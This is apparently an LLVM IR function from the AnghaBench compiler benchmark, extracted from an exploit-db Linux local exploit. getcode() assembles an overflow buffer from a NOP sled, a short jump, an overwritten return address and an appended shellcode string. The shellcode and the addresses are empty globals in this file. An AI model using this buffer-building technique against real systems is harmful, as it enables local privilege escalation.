; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_1187.c_getcode.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_1187.c_getcode.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@BUFSIZE = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [37 x i8] c"getcode(): allocating memory failed.\00", align 1
@PLACEMENT_OFFSET = common dso_local global i32 0, align 4
@RET_ADDR = common dso_local global i64 0, align 8
@REPLACE_VI_ADDR = common dso_local global i64 0, align 8
@x86_exec = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i8* @getcode() #0 {
  %1 = alloca i8*, align 8
  %2 = load i32, i32* @BUFSIZE, align 4
  %3 = add nsw i32 %2, 1
  %4 = call i64 @malloc(i32 %3)
  %5 = inttoptr i64 %4 to i8*
  store i8* %5, i8** %1, align 8
  %6 = icmp ne i8* %5, null
  br i1 %6, label %9, label %7

7:                                                ; preds = %0
  %8 = call i32 @printe(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str, i64 0, i64 0), i32 1)
  br label %9

9:                                                ; preds = %7, %0
  %10 = load i8*, i8** %1, align 8
  %11 = load i32, i32* @BUFSIZE, align 4
  %12 = call i32 @memset(i8* %10, i32 144, i32 %11)
  %13 = load i8*, i8** %1, align 8
  %14 = load i32, i32* @PLACEMENT_OFFSET, align 4
  %15 = mul nsw i32 %14, 4
  %16 = add nsw i32 254, %15
  %17 = sext i32 %16 to i64
  %18 = getelementptr inbounds i8, i8* %13, i64 %17
  store i8 -21, i8* %18, align 1
  %19 = load i8*, i8** %1, align 8
  %20 = load i32, i32* @PLACEMENT_OFFSET, align 4
  %21 = mul nsw i32 %20, 4
  %22 = add nsw i32 255, %21
  %23 = sext i32 %22 to i64
  %24 = getelementptr inbounds i8, i8* %19, i64 %23
  store i8 8, i8* %24, align 1
  %25 = load i64, i64* @RET_ADDR, align 8
  %26 = load i8*, i8** %1, align 8
  %27 = load i32, i32* @PLACEMENT_OFFSET, align 4
  %28 = mul nsw i32 %27, 4
  %29 = add nsw i32 256, %28
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds i8, i8* %26, i64 %30
  %32 = bitcast i8* %31 to i64*
  store i64 %25, i64* %32, align 8
  %33 = load i64, i64* @REPLACE_VI_ADDR, align 8
  %34 = load i8*, i8** %1, align 8
  %35 = load i32, i32* @PLACEMENT_OFFSET, align 4
  %36 = mul nsw i32 %35, 4
  %37 = add nsw i32 260, %36
  %38 = sext i32 %37 to i64
  %39 = getelementptr inbounds i8, i8* %34, i64 %38
  %40 = bitcast i8* %39 to i64*
  store i64 %33, i64* %40, align 8
  %41 = load i8*, i8** %1, align 8
  %42 = load i32, i32* @BUFSIZE, align 4
  %43 = sext i32 %42 to i64
  %44 = getelementptr inbounds i8, i8* %41, i64 %43
  %45 = load i32, i32* @x86_exec, align 4
  %46 = call i32 @strlen(i32 %45)
  %47 = sext i32 %46 to i64
  %48 = sub i64 0, %47
  %49 = getelementptr inbounds i8, i8* %44, i64 %48
  %50 = load i32, i32* @x86_exec, align 4
  %51 = load i32, i32* @x86_exec, align 4
  %52 = call i32 @strlen(i32 %51)
  %53 = call i32 @memcpy(i8* %49, i32 %50, i32 %52)
  %54 = load i8*, i8** %1, align 8
  ret i8* %54
}

declare dso_local i64 @malloc(i32) #1

declare dso_local i32 @printe(i8*, i32) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @memcpy(i8*, i32, i32) #1

declare dso_local i32 @strlen(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
